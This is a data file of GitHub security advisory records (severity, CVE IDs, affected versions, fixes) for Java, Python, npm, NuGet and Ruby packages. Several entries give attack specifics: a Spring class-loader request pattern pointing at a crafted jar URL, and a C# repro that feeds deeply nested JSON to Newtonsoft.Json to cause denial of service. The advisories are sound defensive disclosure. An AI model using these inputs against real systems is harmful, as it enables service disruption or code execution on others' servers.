2557,34032,com.alibaba:fastjson,GHSA-pv7h-hx5h-mgfj,CVE-2022-25845,https://github.com/advisories/GHSA-pv7h-hx5h-mgfj,high,2022-06-11 00:00:17 UTC,Unsafe deserialization in com.alibaba:fastjson,"The package com.alibaba:fastjson before 1.2.83 is vulnerable to Deserialization of Untrusted Data by bypassing the default autoType shutdown restrictions, which is possible under certain conditions. Exploiting this vulnerability allows attacking remote servers. Workaround: If upgrading is not possible, you can enable [safeMode](https://github.com/alibaba/fastjson/wiki/fastjson_safemode).",maven
2558,16343,electron,GHSA-77xc-hjv8-ww97,CVE-2022-29257,https://github.com/advisories/GHSA-77xc-hjv8-ww97,moderate,2022-06-16 23:18:47 UTC,AutoUpdater module fails to validate certain nested components of the bundle,"### Impact
This vulnerability allows attackers who have control over a given apps update server / update storage to serve maliciously crafted update packages that pass the code signing validation check but contain malicious code in some components.

Please note that this kind of attack would require **significant** privileges in your own auto updating infrastructure and the ease of that attack entirely depends on your infrastructure security.

### Patches
This has been patched and the following Electron versions contain the fix:

* `18.0.0-beta.6`
* `17.2.0`
* `16.2.0`
* `15.5.0`

### Workarounds
There are no workarounds for this issue, please update to a patched version of Electron.

### For more information
If you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org)",npm
2559,16343,electron,GHSA-mq8j-3h7h-p8g7,CVE-2022-29247,https://github.com/advisories/GHSA-mq8j-3h7h-p8g7,low,2022-06-16 23:14:33 UTC,Compromised child renderer processes could obtain IPC access without nodeIntegrationInSubFrames being enabled,"### Impact
This vulnerability allows a renderer with JS execution to obtain access to a new renderer process with `nodeIntegrationInSubFrames` enabled which in turn allows effective access to `ipcRenderer`.

Please note the misleadingly named `nodeIntegrationInSubFrames` option does not implicitly grant Node.js access rather it depends on the existing `sandbox` setting.  If your application is sandboxed then `nodeIntegrationInSubFrames` just gives access to the sandboxed renderer APIs (which includes `ipcRenderer`).

If your application then additionally exposes IPC messages without IPC `senderFrame` validation that perform privileged actions or return confidential data this access to `ipcRenderer` can in turn compromise your application / user even with the sandbox enabled.

### Patches
This has been patched and the following Electron versions contain the fix:

* `18.0.0-beta.6`
* `17.2.0`
* `16.2.6`
* `15.5.5`

### Workarounds
Ensure that all IPC message handlers appropriately validate `senderFrame` as per our [security tutorial here](https://github.com/electron/electron/blob/main/docs/tutorial/security.md#17-validate-the-sender-of-all-ipc-messages).

### For more information

If you have any questions or comments about this advisory, email us at [security@electronjs.org](mailto:security@electronjs.org).",npm
2560,20024,notebook,GHSA-v7vq-3x77-87vg,CVE-2022-29238,https://github.com/advisories/GHSA-v7vq-3x77-87vg,moderate,2022-06-16 23:10:10 UTC,Token bruteforcing.,"### Impact
_What kind of vulnerability is it? Who is impacted?_

Authenticated requests to the notebook server with `ContentsManager.allow_hidden = False` only prevented listing the contents of hidden directories, not accessing individual hidden files or files in hidden directories (i.e. hidden files were 'hidden' but not 'inaccessible'). This could lead to notebook configurations allowing authenticated access to files that may reasonably be expected to be disallowed.

Because fully authenticated requests are required, this is of relatively low impact. But if a server's root directory contains sensitive files whose only protection from the server is being hidden (e.g. `~/.ssh` while serving $HOME), then any authenticated requests could access files if their names are guessable. Such contexts also necessarily have full access to the server and therefore execution permissions, which also generally grants access to all the same files. So this does not generally result in any privilege escalation or increase in information access, only an additional, unintended _means_ by which the files could be accessed.

### Patches
_Has the problem been patched? What versions should users upgrade to?_

notebook 6.4.12

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

- Do not run the notebook server in a directory with hidden files, use subdirectories
- Use a custom ContentsManager with additional checks for `self.is_hidden(path)` prior to completing actions

### References
_Are there any links users can visit to find out more?_

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)
",pip
2561,34184,org.springframework:spring,GHSA-vpr3-f594-mg5g,CVE-2010-1622,https://github.com/advisories/GHSA-vpr3-f594-mg5g,moderate,2022-05-17 03:28:34 UTC,Improper Control of Generation of Code ('Code Injection') in Spring Framework,"SpringSource Spring Framework 2.5.x before 2.5.6.SEC02, 2.5.7 before 2.5.7.SR01, and 3.0.x before 3.0.3 allows remote attackers to execute arbitrary code via an HTTP request containing class.classLoader.URLs[0]=jar: followed by a URL of a crafted .jar file.",maven
2562,19965,feedparser,GHSA-3mwg-gp5g-fv3q,CVE-2009-5065,https://github.com/advisories/GHSA-3mwg-gp5g-fv3q,moderate,2022-05-02 04:00:51 UTC,Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') in feedparser,Cross-site scripting (XSS) vulnerability in feedparser.py in Universal Feed Parser (aka feedparser or python-feedparser) before 5.0 allows remote attackers to inject arbitrary web script or HTML via vectors involving nested CDATA stanzas.,pip
2563,28751,pyftpdlib,GHSA-8gv6-x88p-3f6h,CVE-2009-5013,https://github.com/advisories/GHSA-8gv6-x88p-3f6h,moderate,2022-05-02 04:00:27 UTC,Uncontrolled Resource Consumption in pyftpdlib,Memory leak in the on_dtp_close function in ftpserver.py in pyftpdlib before 0.5.2 allows remote authenticated users to cause a denial of service (memory consumption) by sending a QUIT command during a data transfer.,pip
2564,28751,pyftpdlib,GHSA-h4g7-8m7r-87r9,CVE-2009-5012,https://github.com/advisories/GHSA-h4g7-8m7r-87r9,high,2022-05-02 04:00:26 UTC,Improper Access Control in pyftpdlib,"ftpserver.py in pyftpdlib before 0.5.2 does not require the l permission for the MLST command, which allows remote authenticated users to bypass intended access restrictions and list the root directory via an FTP session.",pip
2565,28751,pyftpdlib,GHSA-62xg-239j-vxg7,CVE-2009-5011,https://github.com/advisories/GHSA-62xg-239j-vxg7,moderate,2022-05-02 04:00:27 UTC,Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition') in pyftpdlib,"Race condition in the FTPHandler class in ftpserver.py in pyftpdlib before 0.5.2 allows remote attackers to cause a denial of service (daemon outage) by establishing and then immediately closing a TCP connection, leading to the getpeername function having an ENOTCONN error, a different vulnerability than CVE-2010-3494.",pip
2566,28751,pyftpdlib,GHSA-mpg6-rgp4-35rr,CVE-2009-5010,https://github.com/advisories/GHSA-mpg6-rgp4-35rr,moderate,2022-05-02 04:00:27 UTC,Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition') in pyftpdlib,"Race condition in the FTPHandler class in ftpserver.py in pyftpdlib before 0.5.1 allows remote attackers to cause a denial of service (daemon outage) by establishing and then immediately closing a TCP connection, leading to the accept function having an unexpected return value of None, a different vulnerability than CVE-2010-3494.",pip
2567,35465,org.drools:drools-core,GHSA-rc57-9r3x-98cq,CVE-2021-41411,https://github.com/advisories/GHSA-rc57-9r3x-98cq,critical,2022-06-17 00:01:28 UTC,XML External Entity Reference in drools,"drools <=7.59.x is affected by an XML External Entity (XXE) vulnerability in KieModuleMarshaller.java. The Validator class is not used correctly, resulting in the XXE injection vulnerability.",maven
2568,19862,protobuf,GHSA-jwvw-v7c5-m82h,CVE-2015-5237,https://github.com/advisories/GHSA-jwvw-v7c5-m82h,high,2022-05-13 01:06:54 UTC,protobuf susceptible to buffer overflow,protobuf allows remote authenticated attackers to cause a heap-based buffer overflow.,pip
2569,12977,Google.Protobuf,GHSA-jwvw-v7c5-m82h,CVE-2015-5237,https://github.com/advisories/GHSA-jwvw-v7c5-m82h,high,2022-05-13 01:06:54 UTC,protobuf susceptible to buffer overflow,protobuf allows remote authenticated attackers to cause a heap-based buffer overflow.,nuget
2570,36539,org.apache.hadoop:hadoop-yarn-server-common,GHSA-58jx-f5rf-qgqf,CVE-2021-33036,https://github.com/advisories/GHSA-58jx-f5rf-qgqf,high,2022-06-16 00:00:21 UTC,User account escalation in Apache Hadoop,"In Apache Hadoop 2.2.0 to 2.10.1, 3.0.0-alpha1 to 3.1.4, 3.2.0 to 3.2.2, and 3.3.0 to 3.3.1, a user who can escalate to yarn user can possibly run arbitrary commands as root user. Users should upgrade to Apache Hadoop 2.10.2, 3.2.3, 3.3.2 or higher.",maven
2571,15554,OPCFoundation.NetStandard.Opc.Ua,GHSA-r7pq-3x6p-7jcm,CVE-2022-29863,https://github.com/advisories/GHSA-r7pq-3x6p-7jcm,high,2022-06-17 21:45:15 UTC,Memory Allocation with Excessive Size Value in OPCFoundation.NetStandard.Opc.Ua,A vulnerability was discovered in the OPC UA .NET Standard Stack that allows a malicious client to cause a server to trigger an out of memory exception with a carefully crafted message.,nuget
2572,15554,OPCFoundation.NetStandard.Opc.Ua,GHSA-vhfw-v69p-crcw,CVE-2022-29864,https://github.com/advisories/GHSA-vhfw-v69p-crcw,high,2022-06-17 21:44:58 UTC,Uncontrolled Resource Consumption in OPCFoundation.NetStandard.Opc.Ua,A vulnerability was discovered in the OPC UA .NET Standard Stack that allows a malicious client to cause a server to trigger an out of memory exception by sending a large number of message chunks.,nuget
2573,15554,OPCFoundation.NetStandard.Opc.Ua,GHSA-fvxf-r9fw-49pc,CVE-2022-29865,https://github.com/advisories/GHSA-fvxf-r9fw-49pc,high,2022-06-17 21:44:39 UTC,Incorrect Implementation of Authentication Algorithm in OPCFoundation.NetStandard.Opc.Ua,"A vulnerability was discovered in the OPC UA .NET Standard Stack that
-  allows a malicious client or server to bypass the application authentication mechanism
-  and allow a connection to an untrusted peer.",nuget
2574,15554,OPCFoundation.NetStandard.Opc.Ua,GHSA-6fp8-cxc9-4fr9,CVE-2022-29866,https://github.com/advisories/GHSA-6fp8-cxc9-4fr9,high,2022-06-17 21:44:23 UTC,Uncontrolled Resource Consumption in OPCFoundation.NetStandard.Opc.Ua,A vulnerability was discovered in the OPC UA .NET Standard Stack that allows a malicious client to trigger a stack overflow exception in a server that exposes an HTTPS endpoint.,nuget
2575,15554,OPCFoundation.NetStandard.Opc.Ua,GHSA-5q2v-6j86-5h9v,CVE-2022-29862,https://github.com/advisories/GHSA-5q2v-6j86-5h9v,high,2022-06-17 21:44:01 UTC,Security Update for the OPC UA .NET Standard Stack,A vulnerability was discovered in OPC UA .NET Standard Stack that allows a malicious client or server to cause a peer to hang with a carefully crafted message sent during secure channel creation.,nuget
2576,18859,i18n,GHSA-34hf-g744-jw64,CVE-2014-10077,https://github.com/advisories/GHSA-34hf-g744-jw64,high,2022-05-14 01:48:52 UTC,Denial of service attack in i18n,Hash#slice in lib/i18n/core_ext/hash.rb in the i18n gem before 0.8.0 for Ruby allows remote attackers to cause a denial of service (application crash) via a call in a situation where :some_key is present in keep_keys but not present in the hash.,rubygems
2577,13218,ServiceStack,GHSA-vcfc-9wcp-j623,CVE-2019-1010199,https://github.com/advisories/GHSA-vcfc-9wcp-j623,moderate,2022-05-24 22:00:16 UTC,Cross site scripting attack in ServiceStack Framework,"ServiceStack ServiceStack Framework 4.5.14 is affected by: Cross Site Scripting (XSS). The impact is: JavaScrpit is reflected in the server response, hence executed by the browser. The component is: the query used in the GET request is prone. The attack vector is: Since there is no server-side validation and If Browser encoding is bypassed, the victim is affected when opening a crafted URL. The fixed version is: 5.2.0.",nuget
2578,20776,pysaml2,GHSA-m269-wj6g-c459,CVE-2016-10127,https://github.com/advisories/GHSA-m269-wj6g-c459,critical,2022-05-17 02:56:23 UTC,PySAML2 XML external entity attack,PySAML2 allows remote attackers to conduct XML external entity (XXE) attacks via a crafted SAML XML request or response.,pip
2579,18816,rails,GHSA-q58j-fmvf-9rq6,CVE-2011-1497,https://github.com/advisories/GHSA-q58j-fmvf-9rq6,moderate,2022-04-22 00:24:28 UTC,Cross site scripting in rails < 3.0.6,A cross-site scripting vulnerability flaw was found in the auto_link function in Rails before version 3.0.6.,rubygems
2580,18839,rack,GHSA-xc85-32mf-xpv8,CVE-2013-0263,https://github.com/advisories/GHSA-xc85-32mf-xpv8,moderate,2022-05-05 02:48:42 UTC,Rack arbitrary code execution via timing attack,"Rack::Session::Cookie in Rack 1.5.x before 1.5.2, 1.4.x before 1.4.5, 1.3.x before 1.3.10, 1.2.x before 1.2.8, and 1.1.x before 1.1.6 allows remote attackers to guess the session cookie, gain privileges, and execute arbitrary code via a timing attack involving an HMAC comparison function that does not run in constant time.",rubygems
2581,19850,cryptography,GHSA-q3cj-2r34-2cwc,CVE-2016-9243,https://github.com/advisories/GHSA-q3cj-2r34-2cwc,high,2022-05-17 02:51:56 UTC,Improper input validation in cryptography,HKDF in cryptography before 1.5.3 returns an empty byte-string if used with a length less than algorithm.digest_size.,pip
2582,27168,passenger,GHSA-4284-jfhc-f854,CVE-2018-12615,https://github.com/advisories/GHSA-4284-jfhc-f854,moderate,2022-05-13 01:49:37 UTC,Phusion Passenger incorrect permission assignment,"An issue was discovered in switchGroup() in agent/ExecHelper/ExecHelperMain.cpp in Phusion Passenger before 5.3.2. The set of groups (gidset) is not set correctly, leaving it up to randomness (i.e., uninitialized memory) which supplementary groups are actually being set while lowering privileges.",rubygems
2583,27168,passenger,GHSA-cv3f-px9r-54hm,CVE-2017-16355,https://github.com/advisories/GHSA-cv3f-px9r-54hm,moderate,2022-05-13 01:30:59 UTC,Phusion Passenger information disclosure,"In agent/Core/SpawningKit/Spawner.h in Phusion Passenger 5.1.10 (fixed in Passenger Open Source 5.1.11 and Passenger Enterprise 5.1.10), if Passenger is running as root, it is possible to list the contents of arbitrary files on a system by symlinking a file named REVISION from the application root folder to a file of choice and querying passenger-status --show=xml.",rubygems
2584,19890,Werkzeug,GHSA-h2fp-xgx6-xh6f,CVE-2016-10516,https://github.com/advisories/GHSA-h2fp-xgx6-xh6f,moderate,2022-05-14 03:46:35 UTC,Pallets Werkzeug cross-site scripting vulnerability,Cross-site scripting (XSS) vulnerability in the render_full function in debug/tbtools.py in the debugger in Pallets Werkzeug before 0.11.11 (as used in Pallets Flask and other products) allows remote attackers to inject arbitrary web script or HTML via a field that contains an exception message.,pip
2585,19828,numpy,GHSA-cw6w-4rcx-xphc,CVE-2014-1858,https://github.com/advisories/GHSA-cw6w-4rcx-xphc,moderate,2022-05-14 03:48:04 UTC,Arbitrary file write in NumPy,__init__.py in f2py in NumPy before 1.8.1 allows local users to write to arbitrary files via a symlink attack on a temporary file.,pip
2586,19828,numpy,GHSA-frgw-fgh6-9g52,CVE-2017-12852,https://github.com/advisories/GHSA-frgw-fgh6-9g52,high,2022-05-13 01:42:46 UTC,Numpy missing input validation,"The numpy.pad function in Numpy 1.13.1 and older versions is missing input validation. An empty list or ndarray will stick into an infinite loop, which can allow attackers to cause a DoS attack.",pip
2587,33924,mysql:mysql-connector-java,GHSA-g76j-4cxx-23h9,CVE-2022-21363,https://github.com/advisories/GHSA-g76j-4cxx-23h9,moderate,2022-01-20 00:00:48 UTC,Improper Handling of Insufficient Permissions or Privileges in MySQL Connectors Java,"Vulnerability in the MySQL Connectors product of Oracle MySQL (component: Connector/J). Supported versions that are affected are 8.0.27 and prior. Difficult to exploit vulnerability allows high privileged attacker with network access via multiple protocols to compromise MySQL Connectors. Successful attacks of this vulnerability can result in takeover of MySQL Connectors. CVSS 3.1 Base Score 6.6 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H).",maven
2588,39022,org.apache.logging.log4j:log4j,GHSA-f7vh-qwp3-x37m,CVE-2022-23307,https://github.com/advisories/GHSA-f7vh-qwp3-x37m,critical,2022-01-19 00:01:15 UTC,Deserialization of Untrusted Data in Apache Log4j,CVE-2020-9493 identified a deserialization issue that was present in Apache Chainsaw. Prior to Chainsaw V2.0 Chainsaw was a component of Apache Log4j 1.2.x where the same issue exists.,maven
2589,33931,org.jetbrains.kotlin:kotlin-stdlib,GHSA-2qp4-g3q3-f92w,CVE-2022-24329,https://github.com/advisories/GHSA-2qp4-g3q3-f92w,moderate,2022-02-26 00:00:43 UTC,Improper Locking in JetBrains Kotlin,"In JetBrains Kotlin before 1.6.0, it was not possible to lock dependencies for Multiplatform Gradle Projects.",maven
2590,20627,python-ldap,GHSA-qfr5-wjpw-q4c4,CVE-2021-46823,https://github.com/advisories/GHSA-qfr5-wjpw-q4c4,moderate,2022-06-19 00:00:21 UTC,Denial of Service in python-ldap,"python-ldap before 3.4.0 is vulnerable to a denial of service when ldap.schema is used for untrusted schema definitions, because of a regular expression denial of service (ReDoS) flaw in the LDAP schema parser. By sending crafted regex input, a remote authenticated attacker could exploit this vulnerability to cause a denial of service condition.",pip
2591,17961,mout,GHSA-vvv8-xw5f-3f88,CVE-2022-21213,https://github.com/advisories/GHSA-vvv8-xw5f-3f88,high,2022-06-18 00:00:20 UTC,Prototype Pollution in mout,"This affects all versions of package mout. The deepFillIn function can be used to 'fill missing properties recursively', while the deepMixIn mixes objects into the target object, recursively mixing existing child objects as well. In both cases, the key used to access the target object recursively is not checked, leading to exploiting this vulnerability. **Note:** This vulnerability derives from an incomplete fix of [CVE-2020-7792](https://security.snyk.io/vuln/SNYK-JS-MOUT-1014544).",npm
2592,34676,org.jboss.resteasy:resteasy-client,GHSA-9xfc-j5mf-9w5p,CVE-2016-6348,https://github.com/advisories/GHSA-9xfc-j5mf-9w5p,moderate,2022-05-17 02:49:31 UTC,JacksonJsonpInterceptor susceptible to cross-site script inclusion (XSSI) attack,JacksonJsonpInterceptor in RESTEasy might allow remote attackers to conduct a cross-site script inclusion (XSSI) attack.,maven
2593,35054,edu.stanford.nlp:stanford-corenlp,GHSA-8gf7-w3cp-gfh3,CVE-2021-3869,https://github.com/advisories/GHSA-8gf7-w3cp-gfh3,high,2022-05-24 19:18:01 UTC,Improper Restriction of XML External Entity Reference in Stanford CoreNLP,corenlp is vulnerable to Improper Restriction of XML External Entity Reference,maven
2594,35054,edu.stanford.nlp:stanford-corenlp,GHSA-5h9g-8xcv-qjq9,CVE-2021-3878,https://github.com/advisories/GHSA-5h9g-8xcv-qjq9,critical,2022-05-24 19:17:42 UTC,Improper Restriction of XML External Entity Reference in Stanford CoreNLP,corenlp is vulnerable to Improper Restriction of XML External Entity Reference,maven
2595,34466,org.neo4j:neo4j-kernel,GHSA-2w4h-f44w-968f,CVE-2021-34802,https://github.com/advisories/GHSA-2w4h-f44w-968f,high,2022-05-24 19:09:23 UTC,Improper Privilege Management in Neo4j Graph Database,A failure in resetting the security context in some transaction actions in Neo4j Graph Database 4.2 could allow authenticated users to execute commands with elevated privileges.,maven
2596,19828,numpy,GHSA-fpfv-jqm9-f5jm,CVE-2021-34141,https://github.com/advisories/GHSA-fpfv-jqm9-f5jm,moderate,2021-12-18 00:00:41 UTC,Incorrect Comparison in NumPy,"Incomplete string comparison in the numpy.core component in NumPy1.9.x, which allows attackers to fail the APIs via constructing specific string objects.",pip
2597,20810,apache-airflow,GHSA-h88f-r7cw-8fv3,CVE-2021-38540,https://github.com/advisories/GHSA-h88f-r7cw-8fv3,critical,2022-05-24 19:14:00 UTC,Missing Authentication for Critical Function in Apache Airflow,"The variable import endpoint was not protected by authentication in Airflow >=2.0.0, <2.1.3. This allowed unauthenticated users to hit that endpoint to add/modify Airflow variables used in DAGs, potentially resulting in a denial of service, information disclosure or remote code execution. This issue affects Apache Airflow >=2.0.0, <2.1.3.",pip
2598,19828,numpy,GHSA-5545-2q6w-2gh6,CVE-2021-41495,https://github.com/advisories/GHSA-5545-2q6w-2gh6,high,2022-02-08 00:00:56 UTC,NumPy NULL Pointer Dereference,"Null Pointer Dereference vulnerability exists in numpy.sort in NumPy &lt and 1.19 in the PyArray_DescrNew function due to missing return-value validation, which allows attackers to conduct DoS attacks by repetitively creating sort arrays.",pip
2599,19828,numpy,GHSA-f7c7-j99h-c22f,CVE-2021-41496,https://github.com/advisories/GHSA-f7c7-j99h-c22f,moderate,2022-02-08 00:00:56 UTC,Buffer Copy without Checking Size of Input in NumPy,"Buffer overflow in the array_from_pyobj function of fortranobject.c in NumPy < 1.19, which allows attackers to conduct a Denial of Service attacks by carefully constructing an array with negative values.",pip
2600,17489,shell-quote,GHSA-g4rg-993r-mgx7,CVE-2021-42740,https://github.com/advisories/GHSA-g4rg-993r-mgx7,critical,2022-05-24 19:18:27 UTC,Improper Neutralization of Special Elements used in a Command in Shell-quote,"The shell-quote package before 1.7.3 for Node.js allows command injection. An attacker can inject unescaped shell metacharacters through a regex designed to support Windows drive letters. If the output of this package is passed to a real shell as a quoted argument to a command with exec(), an attacker can inject arbitrary commands. This is because the Windows drive letter regex character class is {A-z] instead of the correct {A-Za-z]. Several shell metacharacters exist in the space between capital letter Z and lower case letter a, such as the backtick character.",npm
2601,16258,got,GHSA-pfrx-2q88-qq97,CVE-2022-33987,https://github.com/advisories/GHSA-pfrx-2q88-qq97,moderate,2022-06-19 00:00:21 UTC,Got allows a redirect to a UNIX socket,The got package before 11.8.5 and 12.1.0 for Node.js allows a redirect to a UNIX socket.,npm
2602,15923,jsdom,GHSA-f4c9-cqv8-9v98,CVE-2021-20066,https://github.com/advisories/GHSA-f4c9-cqv8-9v98,moderate,2022-05-24 17:42:20 UTC,Insufficient Granularity of Access Control in JSDom,"JSDom improperly allows the loading of local resources, which allows for local files to be manipulated by a malicious web page when script execution is enabled.",npm
2603,36163,io.fabric8:kubernetes-client,GHSA-jwh2-ffg4-48xc,CVE-2021-20218,https://github.com/advisories/GHSA-jwh2-ffg4-48xc,high,2022-05-24 17:44:37 UTC,Improper Limitation of a Pathname to a Restricted Directory in Fabric8 Kubernetes Client,A flaw was found in the fabric8 kubernetes-client in version 4.2.0 and after. This flaw allows a malicious pod/container to cause applications using the fabric8 kubernetes-client `copy` command to extract files outside the working path. The highest threat from this vulnerability is to integrity and system availability. This has been fixed in kubernetes-client-4.13.2 kubernetes-client-5.0.2 kubernetes-client-4.11.2 kubernetes-client-4.7.2,maven
2604,34005,org.mongodb:mongo-java-driver,GHSA-rghw-6px2-fgwc,CVE-2021-20328,https://github.com/advisories/GHSA-rghw-6px2-fgwc,moderate,2022-05-24 22:28:56 UTC,Improper Certificate Validation in MongoDB,"Specific versions of the Java driver that support client-side field level encryption (CSFLE) fail to perform correct host name verification on the KMS server’s certificate. This vulnerability in combination with a privileged network position active MITM attack could result in interception of traffic between the Java driver and the KMS service rendering Field Level Encryption ineffective. This issue was discovered during internal testing and affects all versions of the Java driver that support CSFLE. The Java async, Scala, and reactive streams drivers are not impacted. This vulnerability does not impact driver traffic payloads with CSFLE-supported key services originating from applications residing inside the AWS, GCP, and Azure network fabrics due to compensating controls in these environments. This issue does not impact driver workloads that don’t use Field Level Encryption.",maven
2605,34596,org.mongodb:mongodb-driver,GHSA-rghw-6px2-fgwc,CVE-2021-20328,https://github.com/advisories/GHSA-rghw-6px2-fgwc,moderate,2022-05-24 22:28:56 UTC,Improper Certificate Validation in MongoDB,"Specific versions of the Java driver that support client-side field level encryption (CSFLE) fail to perform correct host name verification on the KMS server’s certificate. This vulnerability in combination with a privileged network position active MITM attack could result in interception of traffic between the Java driver and the KMS service rendering Field Level Encryption ineffective. This issue was discovered during internal testing and affects all versions of the Java driver that support CSFLE. The Java async, Scala, and reactive streams drivers are not impacted. This vulnerability does not impact driver traffic payloads with CSFLE-supported key services originating from applications residing inside the AWS, GCP, and Azure network fabrics due to compensating controls in these environments. This issue does not impact driver workloads that don’t use Field Level Encryption.",maven
2606,34743,org.springframework.amqp:spring-amqp,GHSA-945q-ch46-pchg,CVE-2021-22095,https://github.com/advisories/GHSA-945q-ch46-pchg,moderate,2021-12-01 00:00:40 UTC,Deserialization of Untrusted Data in Spring AMQP,"In Spring AMQP versions 2.2.0 - 2.2.19 and 2.3.0 - 2.3.11, the Spring AMQP Message object, in its toString() method, will create a new String object from the message body, regardless of its size. This can cause an OOM Error with a large message",maven
2607,33906,org.springframework:spring-core,GHSA-rfmp-97jj-h8m6,CVE-2021-22096,https://github.com/advisories/GHSA-rfmp-97jj-h8m6,moderate,2022-05-24 19:19:04 UTC,Improper Output Neutralization for Logs in Spring Framework,"In Spring Framework versions 5.3.0 - 5.3.10, 5.2.0 - 5.2.17, and older unsupported versions, it is possible for a user to provide malicious input to cause the insertion of additional log entries.",maven
2608,34743,org.springframework.amqp:spring-amqp,GHSA-fx7f-rjqj-52pj,CVE-2021-22097,https://github.com/advisories/GHSA-fx7f-rjqj-52pj,moderate,2022-05-24 19:19:03 UTC,Deserialization of Untrusted Data in Spring AMQP,"In Spring AMQP versions 2.2.0 - 2.2.18 and 2.3.0 - 2.3.10, the Spring AMQP Message object, in its toString() method, will deserialize a body for a message with content type application/x-java-serialized-object. It is possible to construct a malicious java.util.Dictionary object that can cause 100% CPU usage in the application if the toString() method is called.",maven
2609,33906,org.springframework:spring-core,GHSA-gfwj-fwqj-fp3v,CVE-2021-22118,https://github.com/advisories/GHSA-gfwj-fwqj-fp3v,high,2022-05-24 19:03:28 UTC,Improper Privilege Management in Spring Framework,"In Spring Framework, versions 5.2.x prior to 5.2.15 and versions 5.3.x prior to 5.3.7, a WebFlux application is vulnerable to a privilege escalation: by (re)creating the temporary storage directory, a locally authenticated malicious user can read or modify files that have been uploaded to the WebFlux application, or overwrite arbitrary files with multipart request data.",maven
2610,36572,org.elasticsearch.client:elasticsearch-rest-client,GHSA-hr65-qq6p-87r4,CVE-2021-22137,https://github.com/advisories/GHSA-hr65-qq6p-87r4,moderate,2022-05-24 19:02:19 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Elasticsearch,In Elasticsearch versions before 7.11.2 and 6.8.15 a document disclosure flaw was found when Document or Field Level Security is used. Search queries do not properly preserve security permissions when executing certain cross-cluster search queries. This could result in the search disclosing the existence of documents the attacker should not be able to view. This could result in an attacker gaining additional insight into potentially sensitive indices.,maven
2611,36572,org.elasticsearch.client:elasticsearch-rest-client,GHSA-q394-h7f5-7f44,CVE-2021-22145,https://github.com/advisories/GHSA-q394-h7f5-7f44,moderate,2022-05-24 19:08:49 UTC,Generation of Error Message Containing Sensitive Information in Elasticsearch,A memory disclosure vulnerability was identified in Elasticsearch 7.10.0 to 7.13.3 error reporting. A user with the ability to submit arbitrary queries to Elasticsearch could submit a malformed query that would result in an error message returned containing previously used portions of a data buffer. This buffer could contain sensitive information such as Elasticsearch documents or authentication details.,maven
2612,33924,mysql:mysql-connector-java,GHSA-w6f2-8wx4-47r5,CVE-2021-2471,https://github.com/advisories/GHSA-w6f2-8wx4-47r5,moderate,2022-05-24 19:18:20 UTC,Incorrect Authorization in MySQL Connector Java,Vulnerability in the MySQL Connectors product of Oracle MySQL (component: Connector/J). Supported versions that are affected are 8.0.26 and prior. Difficult to exploit vulnerability allows high privileged attacker with network access via multiple protocols to compromise MySQL Connectors. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all MySQL Connectors accessible data and unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Connectors. CVSS 3.1 Base Score 5.9 (Confidentiality and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:H).,maven
2613,38767,org.wildfly.security:wildfly-elytron,GHSA-5499-qjvh-6j7w,CVE-2021-3642,https://github.com/advisories/GHSA-5499-qjvh-6j7w,moderate,2022-05-24 19:10:03 UTC,Observable Discrepancy in Wildfly Elytron,"A flaw was found in Wildfly Elytron where ScramServer may be susceptible to Timing Attack if enabled. The highest threat of this vulnerability is confidentiality. This flaw affectes Wildfly Elytron versions prior to 1.10.14.Final, prior to 1.15.5.Final and prior to 1.16.1.Final.",maven
2614,12842,Newtonsoft.Json,GHSA-5crp-9r3c-p9vr,,https://github.com/advisories/GHSA-5crp-9r3c-p9vr,high,2022-06-22 15:08:47 UTC,Improper Handling of Exceptional Conditions in Newtonsoft.Json,"Newtonsoft.Json prior to version 13.0.1 is vulnerable to Insecure Defaults due to improper handling of expressions with high nesting level that lead to StackOverFlow exception or high CPU and RAM usage. Exploiting this vulnerability results in Denial Of Service (DoS). 

The serialization and deserialization path have different properties regarding the issue.

Deserializing methods (like `JsonConvert.DeserializeObject`) will process the input that results in burning the CPU, allocating memory, and consuming a thread of execution. Quite high nesting level (>10kk, or 9.5MB of `{a:{a:{...` input) is needed to achieve the latency over 10 seconds, depending on the hardware.

Serializing methods (like `JsonConvert.Serialize` or `JObject.ToString`) will throw StackOverFlow exception with the nesting level of around 20k.

To mitigate the issue one either need to update Newtonsoft.Json to 13.0.1 or set `MaxDepth` parameter in the `JsonSerializerSettings`. This can be done globally with the following statement. After that the parsing of the nested input will fail fast with `Newtonsoft.Json.JsonReaderException`:

``` 
JsonConvert.DefaultSettings = () => new JsonSerializerSettings { MaxDepth = 128 };
```

Repro code:
```
//Create a string representation of an highly nested object (JSON serialized)
int nRep = 25000;
string json = string.Concat(Enumerable.Repeat(""{a:"", nRep)) + ""1"" +
 string.Concat(Enumerable.Repeat(""}"", nRep));

//Parse this object (leads to high CPU/RAM consumption)
var parsedJson = JsonConvert.DeserializeObject(json);

// Methods below all throw stack overflow with nRep around 20k and higher
// string a = parsedJson.ToString();
// string b = JsonConvert.SerializeObject(parsedJson);
```

**Note the original statement about the problem only affecting IIS applications is misleading.** Any application is affected, however the IIS has a behavior that stops restarting the instance after some time resulting in a harder-to-fix DoS.",nuget
2615,38767,org.wildfly.security:wildfly-elytron,GHSA-7fhr-2694-rg79,CVE-2020-10714,https://github.com/advisories/GHSA-7fhr-2694-rg79,high,2022-02-15 01:39:57 UTC,Session Fixation in WildFly Elytron,"A flaw was found in WildFly Elytron version 1.11.3.Final and before. When using WildFly Elytron FORM authentication with a session ID in the URL, an attacker could perform a session fixation attack. The highest threat from this vulnerability is to data confidentiality and integrity as well as system availability.",maven
